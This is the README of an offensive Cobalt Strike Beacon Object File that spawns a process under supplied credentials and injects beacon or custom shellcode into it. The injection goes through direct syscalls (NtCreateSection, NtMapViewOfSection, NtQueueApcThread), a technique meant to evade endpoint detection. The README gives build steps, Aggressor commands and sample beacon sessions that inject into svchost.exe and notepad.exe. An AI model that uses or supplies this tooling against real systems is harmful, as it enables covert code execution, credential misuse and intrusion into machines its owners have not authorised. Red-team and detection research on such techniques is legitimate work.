## Spawn with Syscalls Shellcode Injection (NtMapViewOfSection -> NtQueueApcThread) BOF (64-bit only)

NtCreateSection -> NtMapViewOfSection -> NtQueueApcThread -> NtResumeThead.
Uses `CreateProcessWithLogonW` to create the target process. Spawns as child to current parent process.



Syscalls generated using @jthuraisamy's [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2), @FalconForce's [SysWhispers2BOF](https://github.com/FalconForceTeam/SysWhispers2BOF) and @Outflanknl's [InlineWhispers](https://github.com/outflanknl/InlineWhispers).

Code adapted from @peperunas's [injectopi](https://github.com/peperunas/injectopi/blob/master/CreateSectionAPC/CreateSectionAPC.cpp)

## Compile

```
make
```

## Usage

Aggressor script included contains the following commands:
- `static_syscalls_apc_user_spawn listener_name DOMAIN\User Password Path_to_EXE` - Injects shellcode for beacon into a spawned process. 
- `static_syscalls_apc_user_shspawn path_to_bin DOMAIN\User Password Path_to_EXE` - Injects custom shellcode into a spawned process.

> NOTE: We're using the CreateProcessWithLogonW API call for process spawning, not BeaconSpawnTemporaryProcess. This is what allows us to specify alternate credentials. 

### Custom shellcode
```
beacon> static_syscalls_apc_user_shspawn shell.bin CONTOSO\Admin password123! C:\Windows\System32\notepad.exe
[*] Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)
[*] Reading shellcode from: shell.bin and spawning as CONTOSO\Admin
[+] host called home, sent: 6354 bytes
[+] received output:
Spawned Process with PID: 10480
[+] received output:
Shellcode injection completed successfully!
```

### Beacon shellcode
```
beacon> static_syscalls_apc_user_spawn http CONTOSO\Admin password123! C:\Windows\System32\svchost.exe
[+] Spawning and injecting into C:\Windows\System32\svchost.exe as CONTOS\Admin
[*] Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)
[*] Using http listener for beacon shellcode generation.
[+] host called home, sent: 267710 bytes
[+] received output:
Spawned Process with PID: 8648
[+] received output:
Shellcode injection completed successfully!
```

# TODO
`ppid spoofing`

Don't know how to get `STARTUPINFOEX` to play nicely with `CreateProcessWithLogonW`.
